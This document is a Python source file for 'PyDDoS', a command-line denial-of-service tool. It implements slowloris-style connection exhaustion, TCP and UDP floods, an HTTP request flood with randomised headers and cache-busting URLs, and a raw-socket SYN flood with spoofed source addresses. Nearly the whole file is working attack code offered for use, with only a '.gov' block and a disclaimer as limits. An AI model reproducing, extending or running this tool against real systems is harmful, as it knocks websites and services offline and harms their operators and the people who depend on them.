#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
PyDDoS. A Simple DDoS Tool.

What is DDoS ?
Distributed Denial of Service (DDoS) is an attempt to make an online
service unavailable by ovearwhelming it with traffic from multiple sources.
They target a wide variety of important resources from banks to news
websites, and present a major challenge to making sure people can publish and
access important information.
"""
# Truth this tool was made by someone people but I'am modify it.
# Import Modules
try:
    import os,re,sys,time,random,urllib.request,socket,argparse,threading,platform,struct
except Exception as F:
    exit("\x1b[1;31m   [!] \x1b[0;32m%s\x1b[0;39m"%(F)+"\x1b[0;39m")
# Color
A = "\x1b[1;32m"
B = "\x1b[1;31m"
C = "\x1b[1;33m"
D = "\x1b[1;36m"
E = "\x1b[0;39m"
rand = (A,B,C,D)
W = random.choice(rand)
# Adaptor
name = platform.system()
if name == "Windows":
    clr = "cls"
else:
    clr = "clear"
if sys.version_info[0] != 3:
    exit(B+"   [!] "+A+"This tool work only on python3!"+E)
else:
    pass
# Banner
BR = W+"""
         ____        ____  ____       ____
        |  _ \ _   _|  _ \|  _ \  ___/ ___|
        | |_) | | | | | | | | | |/ _ \___ \ 
        |  __/| |_| | |_| | |_| | (_) |__) |
        |_|    \__, |____/|____/ \___/____/
               |___/
"""
# Notice
__author__ = "H-TCM"
__version__ = "1.5.0"
__date__ = "24-02-2021"
# User-Agent and bots
try:
    agent = open("UserAgent.txt","r").read()
    referer = open("referers.txt","r").read()
    useragent = agent.split("\n")
    bots = referer.split("\n")
except Exception:
    print(B+"   [!] "+A+"Can't open required file "+C+"UserAgent.txt"+A+" or "+C+"referers.txt"+E)
    sys.exit()
class pyslow:
    def __init__(self,host,port,to,threads,sleep):
        self.host = host
        self.port = port
        self.to = to
        self.threads = threads
        self.sleep = sleep
        self.method = ["GET","POST"]
        self.pkt_count = 0
    def mypkt(self):
        text = str("\n%s /%s HTTP/1.1\r\nHost:%s\r\nUser-Agent:%s\r\nContent-Length:42\r"%(random.choice(self.method),random.randint(1,999999999),self.host,random.choice(useragent))).encode("utf-8")
        return text
    def building_socket(self):
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.host,int(self.port)))
            self.pkt_count  += 3
            if sock:
                sock.sendto(self.mypkt(),(self.host,int(self.port)))
                self.pkt_count  += 1
        except Exception:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.host,int(self.port)))
            self.pkt_count  += 3
            if sock:
                sock.sendto(self.mypkt(),(self.host,int(self.port)))
                self.pkt_count  += 1
        except KeyboardInterrupt:
            print(B+"   [!] "+A+"Cancelled by user."+E)
            sys.exit()
        return sock
    def sending_packets(self):
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.host,int(self.port)))
            self.pkt_count  += 3
            if sock:
                sock.sendall(b"X-a: b\r\n")
                self.pkt_count  += 1
        except Exception:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.host,int(self.port)))
            self.pkt_count  += 3
            if sock:
                sock.sendall(b"X-a: b\r\n")
                self.pkt_count  += 1
        except KeyboardInterrupt:
            print(B+"   [!] "+A+"Cancelled by user."+E)
            sys.exit()
        return sock
    def doconnection(self):
        socks = 0
        fail = 0
        lsocks = []
        lhandlers = []
        print(B+"   [!] "+A+"Building socket "+E+"...")
        while socks < int(self.threads):
            try:
                sock = self.building_socket()
                if sock:
                    lsocks.append(sock)
                    socks  += 1
                    if socks > int(self.threads):
                        break
                else:
                    pass
            except Exception:
                fail  += 1
            except KeyboardInterrupt:
                print(B+"   [!] "+A+"Cancelled by user."+E)
                sys.exit()
        print(B+"   [!] "+A+"Sending packets "+E+"...")
        while socks < int(self.threads):
            try:
                handler = self.sending_packets()
                if handler:
                    lhandlers.append(sock)
                    socks  += 1
                    if socks > int(self.threads):
                        break
                else:
                    pass
            except Exception:
                fail  += 1
            except KeyboardInterrupt:
                break
                exit(B+"   [!] "+A+"Cancelled by user."+E)
        print(B+"   [!] "+A+"I have sent "+C+str(self.pkt_count)+A+" packets successfully. Now i'm going to sleep for "+C+self.sleep+A+" second."+E)
        time.sleep(self.sleep)
class tcpflood:
    def __init__(self,host,port):
        self.byte = random._urandom(1490)
        self.tcp_pkt = 0
        self.pkt_fail = 0
        self.host = host
        self.port = port
    def monitor(self):
        sys.stdout.write(B+"\r   [!] "+A+"Succes: "+C+"%s \x1b[1;39m|"%(self.tcp_pkt)+A+" Failed: "+C+"%s"%(self.pkt_fail))
        sys.stdout.flush()
    def send(self):
        while True:
            try:
                mon = threading.Thread(target=self.monitor,daemon=True,name="monitor")
                mon.start()
            except KeyboardInterrupt:
                print(B+"\n   [!] "+A+"Cancelled by user."+E)
                sys.exit()
            try:
                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.host,self.port))
                sent = sock.sendto(self.byte,(self.host,self.port))
                if sent:
                    self.tcp_pkt  += 1
            except KeyboardInterrupt:
                print(B+"\n   [!] "+A+"Cancelled by user."+E)
                sys.exit()
            except Exception:
                self.pkt_fail  += 1
class udpflood:
    def __init__(self,host,port,to):
        self.byte = random._urandom(1490)
        self.udp_pkt = 0
        self.pkt_fail = 0
        self.host = host
        self.port = port
        self.to = to
    def monitor(self):
        sys.stdout.write(B+"\r   [!] "+A+"Succes: "+C+"%s \x1b[1;39m|"%(self.udp_pkt)+A+" Failed: "+C+"%s"%(self.pkt_fail))
        sys.stdout.flush()
    def send(self):
        while True:
            try:
                mon = threading.Thread(target=self.monitor,daemon=True,name="monitor")
                mon.start()
            except KeyboardInterrupt:
                print(B+"\n   [!] "+A+"Cancelled by user."+E)
                sys.exit()
            try:
                sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                sock.settimeout(self.to)
                sock.connect((self.host,self.port))
                sent = sock.sendto(self.byte,(self.host,self.port))
                if sent:
                    self.udp_pkt  += 1
            except KeyboardInterrupt:
                print(B+"\n   [!] "+A+"Cancelled by user."+E)
                sys.exit()
            except Exception:
                self.pkt_fail  += 1
class request:
    def __init__(self,url,host):
        self.url = url
        self.name = host
        self.req_pkt = 0
        self.pkt_fail = 0
    def monitor(self):
        sys.stdout.write(B+"\r   [!] "+A+"Requests: "+C+"%s \x1b[1;39m|"%(self.req_pkt)+A+" Failed: "+C+"%s"%(self.pkt_fail))
        sys.stdout.flush()
    def block_str(self,size):
        mystr = ""
        for x in range(size):
            rand = random.choice([random.randint(48,57),random.randint(65,90),random.randint(97,122)])
            mystr  += chr(rand)
        return mystr
    def create_url(self):
        if self.url.count("/") == 2:
            self.url = self.url+"/"
        else:
            self.url = self.url
        if self.url.count("?") > 0:
            param = "&"
        else:
            param = "?"
        return self.url+param+self.block_str(random.randint(3,10))+"="+self.block_str(random.randint(3,10))
    def rand_user(self):
        return random.choice(useragent)
    def rand_bots(self):
        return random.choice(bots)+self.block_str(random.randint(5,10))
    def header(self):
        cache = ["no-cache","no-store","max-age="+str(random.randint(0,10)),"max-stale="+str(random.randint(0,100)),"min-fresh="+str(random.randint(0,10)),"notransform","only-if-cache"]
        headers = {
            "User-Agent":self.rand_user(),
            "Cache-Control":random.choice(cache),
            "Accept-Charset":"ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Referer":self.rand_bots(),
            "Keep-Alive":str(random.randint(110,120)),
            "Connection":"keep-alive",
            "Host":self.name
        }
        return headers
    def send(self):
        while True:
            try:
                mon = threading.Thread(target=self.monitor,daemon=True,name="monitor")
                mon.start()
            except KeyboardInterrupt:
                print(B+"\n   [!] "+A+"Cancelled by user."+E)
                sys.exit()
            try:
                method = ["GET","POST"]
                request = urllib.request.Request(self.create_url(),headers=self.header(),method=random.choice(method))
                send = urllib.request.urlopen(request)
                if send:
                    self.req_pkt  += 1
            except KeyboardInterrupt:
                print(B+"\n   [!] "+A+"Cancelled by user."+E)
                sys.exit()
            except Exception:
                self.pkt_fail  += 1
class synflood(threading.Thread):
    def __init__(self,host,ip,sock=None):
        threading.Thread.__init__(self)
        self.host = host
        self.ip = ip
        self.psh = ""
        self.lock = threading.Lock()
        if sock is None:
            try:
                self.sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
                self.sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
            except PermissionError:
                print(B+"   [!] "+A+"You have'n enought permission to run this script."+E)
                sys.exit()
        else:
            try:
                self.sock = sock
            except PermissionError:
                print(B+"   [!] "+A+"You have'n enought permission to run this script."+E)
                sys.exit()
    def checksum(self):
        s = 0
        for i in range(0,len(self.psh),2):
            w = (ord(self.psh[i]) << 8)+(ord(self.psh[i+1]))
            s = s+w
        s = (s >> 16)+(s & 0xffff)
        s = ~s & 0xffff
        return s
    def building_packet(self):
        ihl = 5
        version = 4
        tos = 0
        tot = 40
        id = 54321
        frag_off = 0
        ttl = 64
        protocol = socket.IPPROTO_TCP
        check = 10
        s_addr = socket.inet_aton(self.ip)
        d_addr = socket.inet_aton(self.host)
        ihl_version = (version << 4)+ihl
        ip_header = struct.pack("!BBHHHBBH4s4s",ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)
        source = 54321
        dest = 80
        seq = 0
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        ack = 0
        psh = 0
        urg = 0
        window = socket.htons(5840)
        check = 0
        urg_prt = 0
        offset_res = (doff << 4)
        tcp_flags = fin+(syn << 1)+(rst << 2)+(psh << 3)+(ack << 4)+(urg << 5)
        tcp_header = struct.pack("!HHLLBBHHH",source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)
        src_addr = socket.inet_aton(self.ip)
        dst_addr = socket.inet_aton(self.host)
        place = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        self.psh = struct.pack("!4s4sBBH",src_addr,dst_addr,place,protocol,tcp_length)
        self.psh = self.psh+tcp_header
        tcp_checksum = self.checksum()
        tcp_header = struct.pack("!HHLLBBHHH",source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
        packet = ip_header+tcp_header
        return packet
    def run(self):
        packet = self.building_packet()
        try:
            self.lock.acquire()
            self.sock.sendto(packet,(self.host,0))
        except KeyboardInterrupt:
            print(B+"   [!] "+A+"Cancelled by user."+E)
            sys.exit()
        except Exception as F:
            print(B+"   [!] "+A+"%s"%(F)+E)
            sys.exit()
        finally:
            self.lock.release()
class main:
    def check_host(self,args):
        try:
            os.system(clr)
            print(BR)
            socket.gethostbyname(args)
        except Exception:
            print(B+"   [!] "+A+"Unknown host: "+C+args+E)
            sys.exit()
    def fake_ip(self):
        ip = [random.randrange(0,256),random.randrange(0,256),random.randrange(0,256),random.randrange(0,256)]
        if ip[0] == "127":
            return fake_ip()
        else:
            fkip = str("%s.%s.%s.%s"%(ip[0],ip[1],ip[2],ip[3]))
        return fkip
    def parameters(self):
        parser = argparse.ArgumentParser(prog="PyDDoS",description="What is DDoS ?\nDistributed Denial of Service (DDoS) is an attempt to make an online\nservice unavailable by overwhelming it with traffic from multiple sources.\nThey target a wide variety of important resources from banks to news\nwebsites, and present a major challenge to making sure people can publish\nand access important information.",usage="./ddos.py [-s TARGET] [-p PORT] [-t THREADS]",epilog="NOTE: You must choose attack type and don't attack .gov website!.\nBy using this tool you have agreed to the terms and conditions that apply.\nAnd the Author will not be responsible for anything that could happen.\nThanks you for using this tool.",formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument("-V","--version",action="store_true",help="show version info and exit",dest="version")
        options = parser.add_argument_group("positional arguments")
        options.add_argument("-i",metavar="<IP Address>",default=False,help="[synflood] specify spoofed IP unless use fake IP")
        options.add_argument("-o",metavar="<float>",default=3.0,help="set timeout for socket")
        options.add_argument("-p",metavar="<int>",default=80,help="specify port target (default: 80)")
        options.add_argument("-r",metavar="<int>",default=5,help="[pyslow] set sleep time for reconnection (default: 5)")
        options.add_argument("-s",metavar="<IP|Domain>",default=False,help="specify your target such an IP or domain name")
        options.add_argument("-t",metavar="<int>",default=1000,help="set threads number for connection (default: 1000)")
        options.add_argument("--fakeip",action="store_true",default=False,help="[synflood] for create fake IP if not specify spoofed IP")
        options.add_argument("--pyslow",action="store_true",help="enable pyslow attack")
        options.add_argument("--request",action="store_true",help="enable request attack")
        options.add_argument("--synflood",action="store_true",help="enable synflood attack")
        options.add_argument("--tcpflood",action="store_true",help="enable TCP attack")
        options.add_argument("--udpflood",action="store_true",help="enable UDP attack")
        args = parser.parse_args()
        if args.version:
            print("PyDDoS %s from https://github.com/H-TCM/PyDDoS."%(__version__))
            sys.exit()
        if args.s == False:
            parser.print_help()
            sys.exit()
        if "://" in args.s:
            self.url = args.s
            regex = re.search("(https?\://)?([^/]*)/?.*",args.s)
            group = regex.group(2)
            args.s = group
            self.name = group
        else:
            args.s = args.s
            self.name = args.s
            self.url = "http://"+args.s
        if not "." in args.s:
            print(B+"   [!] "+A+"Invalid URL Format! Enter A Valid URL."+E)
            sys.exit()
        if ".gov" in args.s:
            print(B+"   [!] "+A+"You can't attack .gov website!"+E)
            sys.exit()
        if args.s:
            self.check_host(args.s)
        if args.pyslow:
            try:
                host = args.s
                port = args.p
                to = float(args.o)
                sleep = int(args.r)
                threads = int(args.t)
            except Exception as F:
                print(B+"   [!] "+A+"%s"%(F)+E)
                sys.exit()
            while True:
                try:
                    worker = pyslow(host,port,to,threads,sleep)
                    worker.doconnection()
                except KeyboardInterrupt:
                    print(B+"   [!] "+A+"Cancelled by user."+E)
                    sys.exit()
        if args.tcpflood:
            print(B+"   [!] "+A+"Start send packet to: "+C+args.s+E)
            try:
                host = args.s
                port = args.p
            except Exception as F:
                print(B+"   [!] "+A+"%s"%(F)+E)
                sys.exit()
            try:
                for x in range(int(args.t)):
                    worker = tcpflood(host,port)
                    worker.send()
            except KeyboardInterrupt:
                print(B+"\n   [!] "+A+"Cancelled by user."+E)
                sys.exit()
        if args.udpflood:
            print(B+"   [!] "+A+"Start send packet to: "+C+args.s+E)
            try:
                host = args.s
                to = float(args.o)
            except Exception as F:
                print(B+"   [!] "+A+"%s"%(F)+E)
                sys.exit()
            try:
                for x in range(int(args.t)):
                    port = random.randint(0,65535)
                    worker = udpflood(host,port,to)
                    worker.send()
            except KeyboardInterrupt:
                print(B+"\n   [!] "+A+"Cancelled by user."+E)
                sys.exit()
        if args.request:
            print(B+"   [!] "+A+"Start send request to: "+C+args.s+E)
            try:
                for x in range(int(args.t)):
                    reqter = request(self.url,self.name)
                    reqter.send()
            except KeyboardInterrupt:
                print(B+"\n   [!] "+A+"Cancelled by user."+E)
                sys.exit()
        if args.synflood:
            uid = os.getuid()
            if uid != 0:
                print(B+"   [!] "+A+"You have'n enought permission to run this script."+E)
                sys.exit()
            else:
                try:
                    host = socket.gethostbyname(args.s)
                    synsock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
                    synsock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
                except PermissionError:
                    print(B+"   [!] "+A+"You have'n enought permission to run this script."+E)
                    sys.exit()
                while True:
                    ts = []
                    threads = []
                    print(B+"   [!] "+A+"Started synflood: "+C+host+E)
                    if args.i == False:
                        args.fakeip = True
                        if args.fakeip == True:
                            ip = self.fake_ip()
                    else:
                        ip = args.i
                    try:
                        for x in range(0,args.t):
                            thr = synflood(host,ip,sock=synsock)
                            thr.daemon = True
                            thr.start()
                    except KeyboardInterrupt:
                        print(B+"   [!] "+A+"Cancelled by user."+E)
                        sys.exit()
        if args.pyslow == False and args.synflood == False and args.request == False and args.tcpflood == False and args.udpflood == False:
            print(B+"   [!] "+A+"You must choose attack type!"+E)
            sys.exit()
if __name__ == "__main__":
    main = main()
    main.parameters()
else:
    pass
